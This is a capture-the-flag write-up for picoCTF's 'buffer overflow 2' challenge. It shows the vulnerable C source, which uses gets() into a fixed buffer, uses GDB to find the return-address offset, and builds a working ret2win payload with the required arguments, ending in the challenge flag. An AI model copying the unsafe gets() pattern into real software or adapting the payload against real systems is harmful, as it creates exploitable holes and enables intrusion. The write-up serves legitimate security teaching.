# buffer overflow 2
slopey112 - 4/11/19

We are given a binary wherein when we input a string, it bounces it back to us.
```
root@kali:~/Crack Me# ./vuln3
Please enter your string: 
a string!
a string!
```
Well that's not very helpful. Taking a look at the source code shows us the vulnerability in this program.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Okay. So once again, as the title states, we have a buffer overflow vulnerability; the `vuln` function allows us to put as much stuff as we want inside. And conveniently enough, there is a `win` function disconnected from the rest of the function. What's more, it requires two parameters for us to get the flag.

Let's start by finding the offset. We'll load up GDB and we'll feed in a generic alphabet pattern.
```
(gdb) r <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'")
Starting program: /root/Crack Me/vuln3 <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'")
Please enter your string: 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```
Okay. So we get a segmentation fault when we are accessing `0x43434343`, which is `CCCC` in ASCII. Let's take a step back and ask how we even ran into a segmentation fault. At the core of the problem, a segmentation fault is triggered when we are trying to access memory that doesn't exist. Let's think about that for a moment. In what situation in this program would a buffer overflow make it such that unattainable memory, in this case `0x43434343` is accessed?

The answer lies in memory. Let's say we're in our main function and we call another function. Before we jump to that function, we push our current address in our stack. That way, when the method we call is finished executing, the program simply looks back on the stack for where to go. So that means we must have overwritten our return address!

We can exploit this easily by popping in the address of the `win` function instead of `CCCC`. Insofar as the parameters, that's an easy fix as well--parameters to methods are pushed onto the stack. So all we need to do is the same. A key thing to note is the presence of the saved EBP address. Remember how we need to remember where we were last? That's the saved EBP address. So we'll need an extra 4 bytes to overwrite that.

Putting all of that together, we get our payload. Let's put a breakpoint at the last instruction of the `vuln` function and we'll see this thing in action.
```
(gdb) b *0x0804866c
Breakpoint 1 at 0x804866c
(gdb) r <<< $(python -c "print 'A'*112+'\xcb\x85\x04\x08'+'BBBB'+'\xef\xbe\xad\xde'+'\xde\xc0\xad\xde'")
Starting program: /root/Crack Me/vuln3 <<< $(python -c "print 'A'*112+'\xcb\x85\x04\x08'+'BBBB'+'\xef\xbe\xad\xde'+'\xde\xc0\xad\xde'")
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ�����

Breakpoint 1, 0x0804866c in vuln ()
(gdb) si
0x080485cb in win ()
```
Bam. When we make a single step in the function, we go to `win` instead of `main`, where the method was called.

And when we do this on the shell server, we get our flag.
```
slopey112@pico-2018-shell:/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa$ python -c "print 'A'*
112+'\xcb\x85\x04\x08'+'BBBB'+'\xef\xbe\xad\xde'+'\xde\xc0\xad\xde'" | ./vuln
Please enter your string:                                                                                      
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
A˅BBBBﾭ-                                                                                                       
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}
```
